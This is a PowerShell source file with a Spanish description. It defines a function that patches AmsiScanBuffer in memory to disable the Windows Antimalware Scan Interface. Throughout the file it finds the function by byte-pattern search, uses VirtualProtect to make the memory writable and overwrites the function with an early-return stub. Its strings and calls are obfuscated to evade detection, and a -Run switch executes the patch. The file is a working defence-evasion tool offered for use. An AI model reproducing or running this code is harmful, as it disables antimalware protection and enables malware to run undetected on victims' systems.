function Invoke-MemoryPatchingOfuscated{

    [CmdletBinding()]
    Param(
    [string] $Get,
    [switch] $Run,
    [switch] $Import
    )
    
    $Bypass = New-Object -TypeName PSObject
    $Name = "Memory Patching Ofuscado"
    $Description = "Este bypass es una versiùn modificada de la tecnica de parcheo de 4ms1ScanBuffer() en memoria."
    $Script = {
        
        ${K`ERNel`32}   =  @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

.('adD-'+ 't' +  'YpE' ) ${ker`N`El`32}

Class Hunter {
    static [IntPtr] FindAddress([IntPtr]${AD`D`RESS}, [byte[]]${E`gg}) {
        while (${Tr`Ue}) {
            [int]${c`OuNT}   =  0

            while ( ${t`RuE}) {
                [IntPtr]${A`DD`REsS} = [IntPtr]::"a`dD"(${Ad`D`ReSs}, 1 )
                If (  [System.Runtime.InteropServices.Marshal]::"re`A`DByTe"(  ${aDd`R`EsS} ) -eq ${E`GG}."G`Et"( ${CoU`NT} )) {
                    ${C`oUnT}++
                    If (  ${COU`Nt} -eq ${e`gg}."LE`Ng`TH"  ) {
                        return [IntPtr]::"sU`BT`Ract"(${ADDR`e`SS}, ${e`gg}."lEn`gtH" - 1)
                    }
                } Else { break }
            }
        }

        return ${addRe`ss}
    }
}

[IntPtr]${HmO`D`UlE}  =  [Kernel32]::"LOA`DLIB`R`ARY"( ( 'am' + 'si.'+  'dll'  ))
 &(  'wri'+  'TE-HOS'+ 't') ('[+]'+  ' '+ 'A' +("{0}{1}"-f 'MSI',' ') +  'DLL'  +  ' '+  'H'  + 'a'+ (  "{1}{0}"-f ': ','ndle'  )+  "$hModule"  )

[IntPtr]${DLLC`AN`UN`L`O`ADnoWad`dRESS}  = [Kernel32]::"g`e`TProcAd`DRESs"( ${h`MoDulE}, (  ( "{1}{0}"-f'lCa','Dl' ) +  ("{1}{0}"-f'Unlo','n' )  +  'ad'+  'Now') )
  &( 'WRi' +  'TE-hOs'+ 't' ) (  '[+]'  + ' '  +  'Dl' +  'lCa' +  ( "{1}{2}{0}" -f'a','nUnl','o')  + 'd' +  ("{1}{0}"-f' ','Now')+ 'a'+  'ddr'+  ( "{1}{0}" -f 'ss: ','e' ) +  "$dllCanUnloadNowAddress")

If ( [IntPtr]::"si`zE" -eq 8) {
	.(  'W' +'ri'  +'TE-hOST') ( '[+' +'] '  +  (  "{1}{0}" -f'4-bi','6'  )  +'ts'  +( "{0}{1}" -f' p','ro') +  ("{0}{1}"-f 'ce','ss'))
    [byte[]]${E`GG} = [byte[]] (  
        0x4C, 0x8B, 0xDC,       
        0x49, 0x89, 0x5B, 0x08, 
        0x49, 0x89, 0x6B, 0x10, 
        0x49, 0x89, 0x73, 0x18, 
        0x57,                   
        0x41, 0x56,             
        0x41, 0x57,             
        0x48, 0x83, 0xEC, 0x70  
    )
} Else {
	.( 'w'+  'ritE-Ho' + 'St'  ) ( ("{2}{1}{0}" -f '2-bi','+] 3','['  )+ 'ts'  + ( "{0}{1}"-f ' pro','c' )  +'ess')
    [byte[]]${E`GG} =   [byte[]] (  
        0x8B, 0xFF,             
        0x55,                   
        0x8B, 0xEC,             
        0x83, 0xEC, 0x18,       
        0x53,                   
        0x56                    
     )
}
[IntPtr]${Tar`g`ETEdaD`DR`eSS} = [Hunter]::"Fi`Ndadd`R`ESS"(${DLLCa`Nu`Nlo`AD`NOWADdREsS}, ${E`gG}  )
.( 'wRiTE'  +  '-h'  + 'oSt'  ) ('['+'+] ' +( "{0}{1}{2}"-f'Ta','rg','et' )  + 'e'  +  'd '+( "{1}{0}" -f'ss','addre') + ':' +  ' '+  "$targetedAddress")

${olDP`R`OTectio`NBuF`FEr} =  0
[Kernel32]::"VI`RTU`ALp`R`otecT"(  ${TARgET`EDaD`DRe`ss}, [uint32]2, 4, [ref]${O`LD`Pr`oT`eCtioN`BuF`FeR})   | .( 'Ou' +'t-N'  +'uLl'  )

${p`AtCh}   =   [byte[]] ( 
    0x31, 0xC0,    
    0xC3           
  )
[System.Runtime.InteropServices.Marshal]::"c`oPY"( ${PaT`CH}, 0, ${TARg`et`ed`Addre`SS}, 3 )

${A} =  0
[Kernel32]::"vI`RTUaLpRote`cT"(${TArg`e`TE`dad`dR`EsS}, [uint32]2, ${OldP`R`oT`ECtI`O`NBuFfEr}, [ref]${a})   | .  (  'OU'+  'T-NUl'  +  'l')


    }


    $Bypass | Add-Member -MemberType NoteProperty -Name "Name" -Value $Name
    $Bypass | Add-Member -MemberType NoteProperty -Name "Description" -Value $Description
    $Bypass | Add-Member -MemberType NoteProperty -Name "Script" -Value $Script
    $Bypass | Add-Member -MemberType ScriptMethod -Name RunScript -Value {$Bypass.Script | IEX}


    if($Run){
        $Bypass.RunScript()
        return
    }

    if($Import){
        return $Bypass
    }

    if($Get.Length -ne 0)
    {
        if($Get -eq "All"){
            $Bypass.PSObject.Properties | ForEach-Object{

                $name = $_.Name 
                $value = $_.value
                Write-Host "`n${name}: `n$value`n"
                

            }
        }else{
            Write-Output $Bypass | Select-Object -Property $Get
        }
        return
    }

    $Name
    Write-Host "`n=========DescripciÛn=========="
    $Description
    Write-Host "`n===========Script============="
    $Script

}